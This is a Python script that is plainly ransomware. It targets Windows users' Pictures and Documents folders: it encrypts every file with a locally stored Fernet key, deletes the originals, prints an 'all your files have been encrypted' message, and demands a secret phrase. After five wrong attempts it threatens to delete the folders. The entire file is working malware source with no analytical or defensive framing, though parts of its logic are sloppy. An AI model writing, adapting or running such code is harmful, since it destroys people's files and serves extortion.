from cryptography.fernet import Fernet as fn
import os
import platform
global path, user, dirs


x = platform.uname()
if x.system == "Windows":
    user = os.getenv("USERNAME")
    path = f'C:\\Users\\{user}\\AppData\\Roaming\\keys\\'
    pics = f"C:\\Users\\{user}\\Pictures\\"
    docs = f"C:\\Users\\{user}\\Documents\\"
    dirs = [pics, docs]


def gen_key():
    if os.path.exists(f"{path}mykey.key"):
        with open(f'{path}mykey.key', 'rb') as keys:
            key = keys.read()
        return key
    else:
        os.mkdir(path)
        key = fn.generate_key()
        with open(f'{path}mykey.key', 'wb') as keys:
            keys.write(key)
        return key


def encrypt(key):
    f = fn(key)
    for i in dirs:
        for dir in os.listdir(i):
            with open(f"{i}{dir}", 'rb') as files:
                files = files.read()

            enc_pass = f.encrypt(files)

            with open(f"{i}encrypted - {dir}", 'wb') as enc_files:
                enc_files.write(enc_pass)
            os.remove(f"{i}{dir}")


def decrypt(key):
    f = fn(key)
    for i in dirs:
        for dir in os.listdir(i):
            with open(f"{i}{dir}", 'rb') as files:
                files = files.read()

            enc_pass = f.decrypt(files)

            with open(f"{i}{str(dir).replace('encrypted - ','')}", 'wb') as enc_files:
                enc_files.write(enc_pass)
            os.remove(f"{i}{dir}")


lol = gen_key()
encrypt(lol)
x = 0
phrase = "it was never meant to be"
print("All your files have been encrypted ! \n THIS IS NOT A TEST !\n")
print("Enter the secret key to get your files back")
while True:
    response = input(">> ")
    if response.endswith(phrase):
        print("Phrase is correct")
        decrypt(lol)
    else:
        x += 1
        print(f"Phrase is incorrect, {5-x} attempts left")
        if x == 5:
            print("well... i guess i would have to delete all your files then :) ")
            print("\n GOOD BYE")

            for i in dirs:
                os.rmdir(i)
